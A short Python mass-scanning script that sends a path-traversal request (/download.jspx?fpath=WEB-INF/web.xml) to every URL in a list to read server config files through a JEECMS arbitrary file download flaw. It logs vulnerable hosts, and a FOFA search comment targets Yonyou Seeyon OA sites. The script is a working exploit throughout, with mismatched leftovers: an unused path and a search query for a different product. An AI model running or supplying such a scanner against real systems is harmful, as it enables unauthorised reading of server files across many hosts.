
import json
import requests

#fofa：app="Yonyou-Seeyon-OA" && body="致远协创A6" && host!="gov.cn"

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if req.headers["Content-Type"] == "application/xml":
            print("[+]存在jeecms download.jsp 参数fpath任意文件下载漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在jeecms_fpath_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")